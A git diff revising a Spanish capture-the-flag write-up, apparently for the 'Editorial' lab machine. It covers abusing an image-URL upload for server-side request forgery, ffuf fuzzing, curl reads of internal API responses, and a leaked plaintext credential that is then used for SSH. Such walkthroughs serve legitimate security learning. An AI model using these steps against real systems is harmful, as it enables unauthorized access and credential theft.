@@ -79,11 +79,13 @@ Metemos el dominio al `/etc/hosts`
 
 ![](assets/Pasted%20image%2020251222225337.png)
 
-Una de las formas y colocar una URL, yo aquí levante un servidor de python hosteando una imagen para ver si la imagen se reflejaba y en efecto se refleja.
+Una de las formas de subir una imagen es colocar una URL. Por lo cual yo aquí levante un servidor en python hosteando una imagen.
+
+- Coloque la URL y en efecto la imagen se reflejaba
 
 ![](assets/Pasted%20image%2020251222231639.png)
 
-Al interceptar la petición puedo ver la ruta donde se guarda la foto.
+Intercepte la petición de **Preview** con Burpsuite para ver la respuesta, y vemos que al parecer me regresa la ruta a donde se subio mi imagen.
 
 ![](assets/Pasted%20image%2020251222231939.png)
 
@@ -95,7 +97,7 @@ Al interceptar la petición puedo ver la ruta donde se guarda la foto.
 
 **Fuzzing de directorios.**
 
-Realizamos fuzzing con `ffuf` pero solo descubrimos las rutas que ya sabiamos.
+Realizamos fuzzing con `ffuf` pero no encontré nada interesante.
 
 ```bash
 > ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://editorial.htb/FUZZ -e .php,.txt,.py,.xml,.html,.js -ic
@@ -128,7 +130,7 @@ upload                  [Status: 200, Size: 7140, Words: 1952, Lines: 210, Durat
 
 ## Explotación
 
-La peticion de burpsuite me la pase a un archivo llamado `cover.req`
+Volví a interceptar la petición de **Preview** con burpsuite y me la pase a un archivo llamado `cover.req`
 
 ![](assets/Pasted%20image%2020251223003908.png)
 
@@ -228,12 +230,60 @@ Podemos tirarle un `CURL` a esa ruta para ver que contiene.
 
 ```bash
 > curl http://editorial.htb/static/uploads/099ab57f-bfd9-4d74-a1e9-61116eebb0a3
-{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
+{
+  "messages": [
+    {
+      "promotions": {
+        "description": "Retrieve a list of all the promotions in our library.",
+        "endpoint": "/api/latest/metadata/messages/promos",
+        "methods": "GET"
+      }
+    },
+    {
+      "coupons": {
+        "description": "Retrieve the list of coupons to use in our library.",
+        "endpoint": "/api/latest/metadata/messages/coupons",
+        "methods": "GET"
+      }
+    },
+    {
+      "new_authors": {
+        "description": "Retrieve the welcome message sent to our new authors.",
+        "endpoint": "/api/latest/metadata/messages/authors",
+        "methods": "GET"
+      }
+    },
+    {
+      "platform_use": {
+        "description": "Retrieve examples of how to use the platform.",
+        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
+        "methods": "GET"
+      }
+    }
+  ],
+  "version": [
+    {
+      "changelog": {
+        "description": "Retrieve a list of all the versions and updates of the API.",
+        "endpoint": "/api/latest/metadata/changelog",
+        "methods": "GET"
+      }
+    },
+    {
+      "latest": {
+        "description": "Retrieve the last version of the API.",
+        "endpoint": "/api/latest/metadata",
+        "methods": "GET"
+      }
+    }
+  ]
+}
+
 ```
 
-Podemos intuir que en el puerto interno `5000` corre alguna especie de api 
+Podemos intuir que en el puerto interno `5000` corre alguna api. 
 
-- El endpoint que mas me interesa es tal vez este: `/api/latest/metadata/messages/authors`
+- El endpoint que mas me interesa es: `/api/latest/metadata/messages/authors`, asi que desde Burpsuite mande una petición a dicho endpoint.
 
 ![](assets/Pasted%20image%2020251222234443.png)
 
@@ -243,7 +293,16 @@ Nos vuelve a regresar una ruta, por lo cual le tiramos un curl para ver que hay 
 
 ```bash
 curl http://editorial.htb/static/uploads/7862d2eb-b5fc-4567-939c-0ce5043afa84
-{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
+{
+  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.
+   Your login credentials for our internal forum and authors site are:
+   Username: dev
+   Password: dev080217_devAPI!@
+   Please be sure to change your password as soon as possible for security purposes.
+   Don't hesitate to reach out if you have any questions or ideas - we're always here to support you.
+   Best regards,
+   Editorial Tiempo Arriba Team."
+}
 ```
 
 Utilizamos estas credenciales para logearnos por `SSH.`
